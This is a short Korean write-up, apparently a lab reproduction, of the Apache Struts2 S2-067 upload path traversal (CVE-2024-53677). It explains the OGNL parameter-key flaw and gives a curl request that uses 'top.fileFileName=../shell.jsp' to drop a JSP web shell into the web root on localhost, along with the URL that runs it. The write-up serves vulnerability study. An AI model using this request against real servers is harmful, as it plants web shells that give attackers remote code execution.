## Struts2 S2-067 Upload Path Traversal (CVE-2024-53677)

**Apache Strtus2**는 Java EE 웹 애플리케이션 개발을 위해 널리 사용되는 오픈소스 프레임워크입니다. 
해당 프레임워크는 Java Servlet API를 활장해 개발자가 MVC(Model-View-Controller) 아키텍처를 채택할 수 있도록 지원합니다. 
또한 엔터프라이즈 수준의 웹 애플리케이션을 유지 보수 및 확장이 용이하게 개발할 수 있도록 유틸리티를 제공합니다.

---
### S2-067 개요

S2-067은 기존 **S2-066 취약점의 불완전한 패치로부터 파생된 변종**이다.
S2-066은 대소문자 구분 비교 문제로 인해 업로드된 파일명이 덮어쓰기되거나 디렉토리 경로가 우회되는 문제가 있었으며, S2-067은 **다른 메커니즘(OGNL 표현식 평가)**을 활용해 동일한 공격 효과를 냅니다.
Struts2는 요청 시 모든 파라미터 키를 **OGNL(객체 그래프 내비게이션 언어) 표현식**으로 평가합니다. 이 기능은 과거 여러 번 **OGNL 인젝션에 의한 원격 코드 실행(RCE)** 취약점을 발생시킨 주요 원인이었습니다. Struts2는 키에 대한 엄격한 유효성 검사를 도입했지만, **OGNL 표현식 평가 자체는 여전히 작동 중**입니다.  
S2-067은 이 점을 악용하여 파일 업로드 시 사용자가 전달한 키에 따라 **파일명을 덮어쓰고 디렉터리를 우회하여 웹 루트에 저장**하도록 유도할 수 있습니다.

---
### PoC 핵심

OGNL 표현식을 포함하는 파라미터 키 `top.fileFileName` 을 사용하여 다음과 같이 조작하면: 
top.fileFileName = ../shell.jsp
업로드된 파일이 `/upload/shell.jsp`가 아닌 **웹 루트 경로(`/shell.jsp`)에 저장**됩니다.

### 공격 요청 예시 

curl -X POST http://localhost:8080/index.action   -F "file=@shell.jsp;filename=shell.jsp;type=text/plain"   -F "top.fileFileName=../shell.jsp
해당 공격 요청 예씨에서 핵심 부분은 Struts2가 파라미터 키의 형식을 OGNL 표현식으로 처리하는 것이다. 

---
### 업로드 성공

업로드된 해당 웹쉘은 다음 주소에서 실행할 수 있다.
http://localhost:8080/shell.jsp 













